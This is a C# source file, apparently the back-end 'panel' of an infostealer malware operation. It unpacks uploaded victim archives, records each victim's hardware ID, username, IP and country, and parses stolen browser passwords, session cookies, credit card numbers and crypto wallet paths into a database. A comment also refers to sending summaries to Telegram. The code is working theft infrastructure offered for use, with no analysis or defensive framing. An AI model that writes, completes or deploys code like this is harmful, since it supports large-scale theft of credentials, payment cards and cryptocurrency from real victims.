using System.IO;
using System.IO.Compression;
using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using Mirage.Panel.Data;
using Mirage.Panel.Helpers;
using Mirage.Panel.Models;

namespace Mirage.Panel.Services;

public class LogProcessor
{
    private readonly IDbContextFactory<AppDbContext> _dbFactory;
    private const long MaxTotalUncompressedSize = 500L * 1024 * 1024;

    public LogProcessor(IDbContextFactory<AppDbContext> dbFactory) => _dbFactory = dbFactory;

    public Session? Process(byte[] archive, string metadataJson)
    {
        Dictionary<string, string> metadata;
        try
        {
            metadata = string.IsNullOrEmpty(metadataJson)
                ? new Dictionary<string, string>()
                : JsonSerializer.Deserialize<Dictionary<string, string>>(metadataJson) ?? new();
        }
        catch
        {
            metadata = new Dictionary<string, string>();
        }

        var countryRaw = metadata.GetValueOrDefault("country");
        var countryCode = string.IsNullOrEmpty(countryRaw) ? null : countryRaw;
        var safeCountry = countryCode is not null ? Flags.GetFlag(countryCode) : null;

        var session = new Session
        {
            Hwid = metadata.GetValueOrDefault("hwid"),
            Os = metadata.GetValueOrDefault("os"),
            Username = metadata.GetValueOrDefault("username"),
            Ip = metadata.GetValueOrDefault("ip"),
            CountryCode = countryCode,
        };

        long totalUncompressed = 0;

        using var ms = new MemoryStream(archive);
        using var zip = new ZipArchive(ms, ZipArchiveMode.Read);

        foreach (var entry in zip.Entries)
        {
            totalUncompressed += entry.Length;
            if (totalUncompressed > MaxTotalUncompressedSize)
                break;

            // Path traversal protection
            var normalized = entry.FullName.Replace('\\', '/');
            if (normalized.Contains("..") || normalized.StartsWith("/"))
                continue;

            var parts = normalized.Split('/');
            if (parts.Length < 2) continue;
            var category = parts[0].ToLowerInvariant();
            var filename = parts[^1].ToLowerInvariant();

            using var reader = new StreamReader(entry.Open());
            var content = reader.ReadToEnd();

            // Normalize line endings
            content = content.Replace("\r\n", "\n").Replace("\r", "\n");

            switch (category)
            {
                case "browser data":
                    if (filename.Contains("password"))
                        ParsePasswords(content, session);
                    else if (filename.Contains("cookie"))
                        ParseCookies(content, session);
                    else if (filename.Contains("credit") || filename.Contains("card"))
                        ParseCards(content, session);
                    break;
                case "passwords" when filename == "passwords.txt":
                    ParsePasswords(content, session);
                    break;
                case "cookies" when filename == "cookies.txt":
                    ParseCookies(content, session);
                    break;
                case "wallets":
                    var walletName = parts.Length > 2 ? parts[^2] : "unknown";
                    session.Wallets.Add(new Wallet { Name = walletName, Path = entry.FullName });
                    break;
            }
        }

        using var db = _dbFactory.CreateDbContext();
        using var tx = db.Database.BeginTransaction();
        db.Sessions.Add(session);
        db.SaveChanges();
        tx.Commit();

        // Reload with counts for Telegram summary
        var reloaded = db.Sessions
            .Include(s => s.Passwords)
            .Include(s => s.Cookies)
            .Include(s => s.Cards)
            .Include(s => s.Wallets)
            .FirstOrDefault(s => s.Id == session.Id);
        return reloaded;
    }

    private static void ParsePasswords(string content, Session session)
    {
        foreach (var line in content.Split('\n'))
        {
            var trimmed = line.Trim();
            if (string.IsNullOrEmpty(trimmed)) continue;
            var parts = trimmed.Split('\t');
            if (parts.Length >= 3)
                session.Passwords.Add(new Password { Url = parts[0], Username = parts[1], PasswordValue = parts[2] });
        }
    }

    private static void ParseCookies(string content, Session session)
    {
        foreach (var line in content.Split('\n'))
        {
            var trimmed = line.Trim();
            if (string.IsNullOrEmpty(trimmed)) continue;
            var parts = trimmed.Split('\t');
            if (parts.Length >= 7)
                session.Cookies.Add(new Cookie { Domain = parts[0], Name = parts[5], Value = parts[6], Path = parts[2] });
        }
    }

    private static void ParseCards(string content, Session session)
    {
        foreach (var line in content.Split('\n'))
        {
            var trimmed = line.Trim();
            if (string.IsNullOrEmpty(trimmed)) continue;
            var parts = trimmed.Split('\t');
            if (parts.Length >= 4)
                session.Cards.Add(new Card { Number = parts[0], ExpMonth = parts[1], ExpYear = parts[2], Holder = parts[3] });
        }
    }
}
